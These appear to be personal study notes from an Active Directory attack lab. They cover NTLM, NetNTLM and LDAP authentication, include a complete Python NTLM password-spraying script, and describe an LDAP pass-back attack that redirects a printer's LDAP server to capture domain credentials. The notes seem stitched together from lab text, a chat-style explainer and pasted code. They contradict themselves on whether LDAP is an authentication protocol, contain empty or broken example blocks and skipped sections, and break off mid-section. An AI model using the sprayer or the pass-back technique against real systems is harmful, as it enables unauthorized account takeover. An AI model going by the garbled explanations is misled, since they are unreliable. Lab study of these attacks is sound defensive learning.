
NTLM and NetNTLM  

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.  
    

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.

This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should only be stored on a Domain Controller. This process is shown in the diagram below:

![576](attachments/Pasted%20image%2020261005111748.png)

Yes — this distinction is **very important in AD** because people often use **NTLM** and **NetNTLM** interchangeably, but they're not the same thing.

## The simplest way

> **NTLM = the authentication protocol/mechanism.**  
> **NetNTLM = the network challenge-response authentication exchange produced when NTLM is used over the network.**

Think:

```
NTLM
 │
 └── Authentication mechanism
       │
       └── Challenge → Response
                         │
                         ▼
                    NetNTLM exchange
```

---

# 1. What is NTLM?

**NTLM** stands for **NT LAN Manager**.

It is a Microsoft authentication protocol.

Its job is essentially:

> "Prove that this user knows the secret/password without sending the plaintext password."

NTLM uses password-derived cryptographic material to perform authentication.

So when you see:

```
NTLM
```

think:

> **The authentication protocol.**

---

# 2. What is NetNTLM?

**NetNTLM** refers to the **network form of NTLM authentication**, where the client and server perform a challenge-response exchange.

The basic process is:

```
Client                    Server
  │                         │
  │── Authentication ──────►│
  │                         │
  │◄──── Challenge ─────────│
  │                         │
  │──── Response ──────────►│
  │                         │
```

The response is calculated using the user's password-derived secret and the challenge.

For a **domain account**, the server can then involve the Domain Controller to verify the response.

---

# 3. So why do people say "NTLM hash"?

This is where the confusion usually happens.

You might see:

```
Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c
```

That last value is an **NT hash** (often casually called an "NTLM hash").

It is essentially a password-derived hash stored/used as credential material.

It is **not the same thing as a captured NetNTLM challenge-response**.

---

# 4. Compare them

|Term|What it means|
|---|---|
|**NTLM**|Microsoft's authentication protocol|
|**NT hash**|Hash derived from a user's password|
|**NetNTLM**|Network challenge-response authentication exchange using NTLM|
|**NetNTLMv2**|A later version of the network challenge-response mechanism|

This is the distinction you want for AD labs.

# 6. Why does this matter in AD labs?

Because you'll encounter **two very different things**.

### Situation A — You obtain an NT hash

For example from a local SAM or another credential source:

```
8846f7eaee8fb117ad06bdd830b7586c
```

That's an **NT hash**.

You may see it described as an "NTLM hash."

---

### Situation B — You capture network authentication

For example, a user authenticates to a service using NTLM.

You might capture something resembling:

```
USER::DOMAIN:challenge:response:...
```

That's **NetNTLM material**, not simply an NT hash.

The challenge and response are part of the network authentication exchange.

---

# 7. The biggest thing to remember

Don't think:

```
NTLM = hash
NetNTLM = different hash
```

That's the wrong mental model.

Think:

```
NTLM
= authentication protocol

NT hash
= password-derived hash/credential material

NetNTLM
= network challenge-response exchange using NTLM
```

### One-line memory trick

> **NTLM is the protocol; NetNTLM is what you see when that protocol performs challenge-response authentication over the network.**

And in AD labs, if you see:

```
$krb5tgs$...
```

that's **Kerberos/Kerberoasting** territory.

If you see a challenge-response format such as:

```
USER::DOMAIN:CHALLENGE:RESPONSE
```

that's **NetNTLM/NTLM network authentication** territory.

#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

# LDAP Bind Credentials


LDAP is another **very important AD concept**. The easiest way to think about it is:

> **LDAP is the protocol used to communicate with and query a directory such as Active Directory.**

It is **not an authentication protocol like Kerberos or NTLM**.

### Think of AD like a database

Imagine your AD contains:

```
AD
│
├── Users
│   ├── Akshit
│   ├── Alice
│   └── Bob
│
├── Computers
│   ├── PC01
│   └── PC02
│
├── Groups
│   ├── Domain Admins
│   └── IT
│
└── OUs
    ├── HR
    └── Finance
```

LDAP gives applications a standardized way to **ask AD for this information and modify directory objects when permitted**.

For example:

```
LDAP query:
"Find all users in the IT department"
             ↓
          AD / DC
             ↓
       User information
```

---

## LDAP vs Kerberos vs NTLM

This is the important distinction:

|Technology|Main purpose|
|---|---|
|**LDAP**|Communicate with/query the directory|
|**Kerberos**|Authentication using tickets|
|**NTLM**|Authentication using challenge-response|
|**DNS**|Resolve names to IP addresses|
|**SMB**|File/printer sharing and related network communication|

So they can all appear together in an AD environment:

```
                 Active Directory
                       │
              Domain Controller
                       │
       ┌───────────────┼───────────────┐
       │               │               │
      LDAP          Kerberos          DNS
       │               │               │
  Query AD        Authenticate       Resolve
   objects           users            names
```

---

## What does LDAP actually do?

Suppose a tool wants to find:

> "Who are the users in this domain?"

It can query LDAP.

Conceptually:

        │

        ▼

        │
        ▼

        │

```

You might retrieve things like:

```

This is why **LDAP enumeration** is so important during AD assessments.

## What does `LDAP` stand for?

**Lightweight Directory Access Protocol**

The "directory" part is important.

A directory is designed to organize information hierarchically.

For example:

```
DC=za,DC=tryhackme,DC=com
│
├── OU=Users
│    ├── CN=Alice
│    └── CN=Bob

```

You'll see this kind of notation when working with LDAP.

---

## LDAP and authentication

Here's where it can get confusing.

LDAP **can be used in authentication workflows**, but LDAP itself is primarily the **directory access protocol**.

For example:

```
Application
    │
    │ LDAP
    ▼
Domain Controller
    │
    ▼
Active Directory
```

The application might use LDAP to verify or retrieve directory information about a user.

But in a normal AD environment, **Kerberos and NTLM are the major Windows authentication protocols you're learning about**.

LDAP  

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs  
    

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:

![](attachments/Pasted%20image%2020261005164615.png)

If you could gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials. These credentials are often stored in plain text in configuration files since the security model relies on keeping the location and storage configuration file secure rather than its contents. Configuration files are covered in more depth in Task 7.

LDAP Pass-back Attacks  

However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

### **[Section 1: Introduction to LDAP & Third-Party AD Integration]**

This task is connected to LDAP bind credentials and Active Directory (AD), so you must be connected to that specific network. To perform LDAP bind credentials tasks, you have to manage several technical steps, including running an LDAP server.

To understand LDAP: as seen with NTLM, NTLM password hashes are never passed directly over the wire for security reasons; instead, the NetNTLM challenge-response protocol is used. **LDAP (Lightweight Directory Access Protocol)** is also an authentication protocol. Its authentication workflow resembles NTLM, but the key distinction is that LDAP is used primarily for **third-party integration**. For example, when integrating Microsoft products or identity services with non-Microsoft third-party applications—such as GitLab, Jenkins, network printers, VPNs, or custom web applications—you connect authentication via Single Sign-On (SSO) so Microsoft authentication works within your application. NTLM authentication cannot be used directly in these scenarios because it is not mutually supported across non-Windows platforms.

---

### **[Section 2: Direct Credential Transmission & Attack Surface]**

The most significant operational difference with LDAP is that **LDAP credentials are transmitted directly** when authenticating. Unlike NTLM, where credentials are never sent directly, LDAP credentials supplied by third-party applications are passed directly across the connection.

If any of these services or third-party applications are exposed to the internet, attack vectors targeting NTLM credentials can also be applied to LDAP. LDAP services require valid Active Directory credentials associated with an AD domain account to function. Consequently, attacks can be executed to recover AD credentials directly from services attempting authentication.

---

### **[Section 3: Step-by-Step LDAP Authentication Workflow]**

The operational authentication flow functions through the following sequence:

1. **User Request**: A user submits a print job request using their AD username and password to a third-party application (in this scenario, a network printer).
2. **Printer Authentication**: The printer first authenticates itself against the Domain Controller (DC) by sending its own AD service credentials to construct an **LDAP bind request**.
3. **Bind Response**: The Domain Controller authenticates the printer device and returns an initial LDAP bind response.
4. **User Lookup**: The printer executes an LDAP user search query to verify whether the requesting user exists within the Active Directory database.
5. **Search Response**: The LDAP directory returns the user's search response from the database.
6. **User Bind Request**: The printer sends a second LDAP bind request, this time transmitting the requesting user's credentials to authenticate the user.
7. **Authentication Completion**: If the user credentials are valid, the Domain Controller returns a successful bind response, authenticating the user and accepting the print job.

---

### **[Section 4: Configuration Files & Plaintext Credential Exposure]**

In LDAP workflows, Active Directory credentials are passed directly, opening additional attack avenues compared to NTLM. If an attacker establishes an initial foothold on a host within the network (such as a GitLab or Jenkins server), they can inspect local configuration files.

Because LDAP authentication requires direct credentials, these configuration files frequently contain Active Directory credentials stored directly in **plaintext** without hashing. This reflects the core design of the security model.

---

### **[Section 5: LDAP Passback Attack & Rogue LDAP Server Setup]**

In the practical lab scenario, a printer web interface contains pre-filled username and password fields. Inspecting the HTML page source code shows masked password placeholder values (`value="***"`), hiding the actual plaintext password.

To extract the credentials, an **LDAP Passback Attack** is executed:

- If you hold administrative access to a device's configuration interface, you can view and modify its LDAP configuration parameters.
